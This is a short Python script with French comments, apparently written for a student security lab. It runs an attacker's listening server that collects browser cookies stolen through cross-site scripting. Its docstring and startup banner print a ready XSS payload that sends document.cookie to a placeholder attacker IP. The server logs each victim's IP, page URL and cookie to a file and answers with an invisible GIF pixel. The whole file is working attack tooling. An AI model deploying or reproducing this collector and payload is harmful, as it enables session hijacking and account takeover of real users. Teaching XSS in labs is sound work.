#!/usr/bin/env python3
"""
Serveur attaquant - collecteur de cookies volés via XSS.
Usage (sur la machine de l'étudiant attaquant) :
    python3 cookie_stealer.py
Puis dans le payload XSS :
    <script>new Image().src='http://IP_ATTAQUANT:8000/steal?c='+document.cookie;</script>
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import os

PORT = 8000
LOG_FILE = "stolen_cookies.log"

BANNER = r"""
   _____             _    _         _____ _            _           
  / ____|           | |  (_)       / ____| |          | |          
 | |     ___   ___  | | ___  ___  | (___ | |_ ___  __ _| | ___ _ __ 
 | |    / _ \ / _ \ | |/ / |/ _ \  \___ \| __/ _ \/ _` | |/ _ \ '__|
 | |___| (_) | (_) ||   <| |  __/  ____) | ||  __/ (_| | |  __/ |   
  \_____\___/ \___/ |_|\_\_|\___| |_____/ \__\___|\__,_|_|\___|_|   
"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        cookie  = params.get('c', [''])[0]
        url     = params.get('url', [''])[0]
        ts      = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip      = self.client_address[0]

        print(f"\n[+] {ts} — Cookie volé depuis {ip}")
        print(f"    Origine  : {url or 'inconnue'}")
        print(f"    Cookie   : {cookie}\n")

        with open(LOG_FILE, 'a') as f:
            f.write(f"[{ts}] IP={ip} URL={url} COOKIE={cookie}\n")

        # Pixel 1x1 transparent
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        self.wfile.write(gif)

    def log_message(self, fmt, *args):
        pass  # silence le log par défaut

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

if __name__ == '__main__':
    print(BANNER)
    print(f"[*] Serveur d'écoute lancé sur http://0.0.0.0:{PORT}")
    print(f"[*] Les cookies volés seront logués dans : {os.path.abspath(LOG_FILE)}")
    print(f"[*] Payload XSS : <script>new Image().src='http://IP:{PORT}/steal?c='+document.cookie;</script>\n")
    HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()